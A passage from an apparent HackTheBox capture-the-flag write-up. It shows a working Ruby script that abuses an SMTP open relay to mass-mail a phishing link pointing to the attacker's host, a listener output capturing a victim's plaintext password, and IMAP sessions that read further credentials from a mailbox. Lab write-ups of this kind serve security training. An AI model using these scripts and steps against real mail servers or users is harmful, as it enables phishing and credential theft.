was useful for that.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ncat sneakycorp.htb 143</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 LOGIN &quot;cyfun@sneakymailer.htb&quot; &quot;password&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 NO Login failed.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I seems the SMTP server is vulnerable to open relay:</p><blockquote><p>An SMTP server that works as an open relay, is a email server that does not verify if the user is authorised to send email from the specified email address. Therefore, users would be able to send email originating from any third-party email address that they want.</p></blockquote><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ncat sneakycorp.htb 25</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">MA220 debian ESMTP Postfix (Debian/GNU)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">MAIL from:cyfun@sneakymailer.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">250 2.1.0 Ok</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RCPT to:tigernixon@sneakymailer.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">250 2.1.5 Ok</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DATA</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hello open relay</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">250 2.0.0 Ok: queued as 4773E25011</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I wrote a script to abuse of SMTP open relay and send a test email to all users:</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/usr/bin/env ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;socket&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">users = File.read(&#x27;emails.txt&#x27;).split(&quot;\n&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@s = TCPSocket.new(&#x27;sneakycorp.htb&#x27;, 25)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@banner = @s.recv(1024).chomp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">users.each do |user|</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  @s.send &quot;MAIL from:cyfun@sneakymailer.htb \n\r&quot;, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  @s.send &quot;RCPT to:#{user} \n\r&quot;, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  @s.send &quot;DATA \n\r&quot;, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  @s.send &quot;test \r\n.\r\n&quot;, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  resp = @s.recv(1024).chomp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  puts resp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@s.close</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot;[*] Result:-&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot;[+] Banner: &quot; + @banner</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s change the email body content, replacing test by phishing content
like a link to our web server and hope one of the users will click it.</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/usr/bin/env ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;socket&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">users = File.read(&#x27;emails.txt&#x27;).split(&quot;\n&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@s = TCPSocket.new(&#x27;sneakycorp.htb&#x27;, 25)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@banner = @s.recv(1024).chomp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">users.each do |user|</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  @s.send &quot;MAIL from:cyfun@sneakymailer.htb \n\r&quot;, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  @s.send &quot;RCPT to:#{user} \n\r&quot;, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  @s.send &quot;DATA \n\r&quot;, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  @s.send &quot;http://10.10.14.142:8080 \r\n.\r\n&quot;, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  resp = @s.recv(1024).chomp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  puts resp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@s.close</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot;[*] Result:-&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot;[+] Banner: &quot; + @banner</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Nice Paul felt into the trick:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pwncat -l 8080 -vv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Listening on :::8080 (family 10/IPv6, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Listening on 0.0.0.0:8080 (family 2/IPv4, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Client connected from 10.10.10.197:52994 (family 2/IPv4, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">POST / HTTP/1.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host: 10.10.14.142:8080</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User-Agent: python-requests/2.23.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Accept-Encoding: gzip, deflate</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Accept: */*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connection: keep-alive</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Content-Length: 185</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Content-Type: application/x-www-form-urlencoded</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s URL decode the POST body:</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ irb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irb(main):001:0&gt; require &#x27;cgi&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=&gt; true</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irb(main):002:0&gt; puts CGI.unescape(&#x27;firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=&gt; ni</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So here are our creds: <code>paulbyrd@sneakymailer.htb</code> / <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>.</p><p>It seems that the username is not the full email address:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ncat sneakycorp.htb 143</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 LOGIN &quot;paulbyrd@sneakymailer.htb&quot; &quot;^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 NO Login failed.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">^C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ncat sneakycorp.htb 143</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 LOGIN &quot;paulbyrd&quot; &quot;^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 OK LOGIN Ok.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 LIST &quot;&quot; *</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* LIST (\Unmarked \HasChildren) &quot;.&quot; &quot;INBOX&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Trash&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Deleted Items&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Queue&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent Items&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Drafts&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 OK LIST completed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I tried to connect to the IMAP server with Thunderbird and Kube but it
wasn&#x27;t working but when I tried with Evolution it worked.</p><p>But it&#x27;s possible to continue via raw IMAP:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 LIST &quot;INBOX.Sent Items&quot; *</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 OK LIST completed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 SELECT &quot;INBOX.Sent Items&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* 2 EXISTS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* 0 RECENT</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* OK [UIDVALIDITY 589480766] Ok</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 OK [READ-WRITE] Ok</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 FETCH 2 all</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* 2 FETCH (FLAGS (\Seen) INTERNALDATE &quot;23-Jun-2020 09:27:08 -0400&quot; RFC822.SIZE 585 ENVELOPE (&quot;Wed, 27 May 2020 13:28:58 -0400&quot; &quot;Module testing&quot; ((&quot;Paul Byrd&quot; NIL &quot;paulbyrd&quot; &quot;sneakymailer.htb&quot;)) ((&quot;Paul Byrd&quot; NIL &quot;paulbyrd&quot; &quot;sneakymailer.htb&quot;)) ((&quot;Paul Byrd&quot; NIL &quot;paulbyrd&quot; &quot;sneakymailer.htb&quot;)) ((NIL NIL &quot;low&quot; &quot;debian&quot;)) NIL NIL NIL &quot;&lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb&gt;&quot;))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 OK FETCH completed.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 FETCH 1 all</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* 1 FETCH (FLAGS (\Seen) INTERNALDATE &quot;27-May-2020 13:43:07 -0400&quot; RFC822.SIZE 2167 ENVELOPE (&quot;Fri, 15 May 2020 13:03:37 -0500&quot; &quot;Password reset&quot; ((&quot;Paul Byrd&quot; NIL &quot;paulbyrd&quot; &quot;sneakymailer.htb&quot;)) ((&quot;Paul Byrd&quot; NIL &quot;paulbyrd&quot; &quot;sneakymailer.htb&quot;)) ((&quot;Paul Byrd&quot; NIL &quot;paulbyrd&quot; &quot;sneakymailer.htb&quot;)) ((&quot;root&quot; NIL &quot;root&quot; &quot;debian&quot;)) NIL NIL NIL NIL))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 OK FETCH completed.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 FETCH 2 body[text]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* 2 FETCH (BODY[TEXT] {166}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Hello low</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Your current task is to install, test and then erase every python module you</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">find in our PyPI service, let me know if you have any inconvenience.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 OK FETCH completed.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 FETCH 1 body[text]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* 1 FETCH (BODY[TEXT] {1888}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Content-Transfer-Encoding: quoted-printable</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Content-Type: text/plain; charset=&quot;utf-8&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Hello administrator, I want to change this password for the developer accou=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Username: developer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Please notify me when you do it=20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Content-Transfer-Encoding: quoted-printable</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Content-Type: text/html; charset=&quot;utf-8&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;html xmlns:o=3D&quot;urn:schemas-microsoft-com:office:office&quot; xmlns:w=3D&quot;urn:sc=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hemas-microsoft-com:office:word&quot; xmlns:m=3D&quot;http://schemas.microsoft.com/of=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fice/2004/12/omml&quot; xmlns=3D&quot;http://www.w3.org/TR/REC-html40&quot;&gt;&lt;head&gt;&lt;meta ht=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tp-equiv=3DContent-Type content=3D&quot;text/html; charset=3Dutf-8&quot;&gt;&lt;meta name=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=3DGenerator content=3D&quot;Microsoft Word 15 (filtered medium)&quot;&gt;&lt;style&gt;&lt;!--</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/* Font Definitions */</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@font-face</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        {font-family:&quot;Cambria Math&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        panose-1:2 4 5 3 5 4 6 3 2 4;}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@font-face</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        {font-family:Calibri;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        panose-1:2 15 5 2 2 2 4 3 2 4;}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/* Style Definitions */</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">p.MsoNormal, li.MsoNormal, div.MsoNormal</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        {margin:0in;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        margin-bottom:.0001pt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        font-size:11.0pt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        font-family:&quot;Calibri&quot;,sans-serif;}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.MsoChpDefault</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        {mso-style-type:export-only;}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@page WordSection1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        {size:8.5in 11.0in;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        margin:1.0in 1.0in 1.0in 1.0in;}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">div.WordSection1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        {page:WordSection1;}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body lang=3DEN-US link=3Dblue vlink=3D&quot;#954F72&quot;&gt;&lt;div cla=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ss=3DWordSection1&gt;&lt;p class=3DMsoNormal&gt;Hello administrator, I want to chang=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">e this password for the developer account&lt;/p&gt;&lt;p class=3DMsoNormal&gt;&lt;o:p&gt;&amp;nbs=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">p;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Username: developer&lt;/p&gt;&lt;p class=3DMsoNorma=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">l&gt;Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/p&gt;&lt;p class=3DMsoNorm=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">al&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Please notify me when you do i=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">t &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A1 OK FETCH 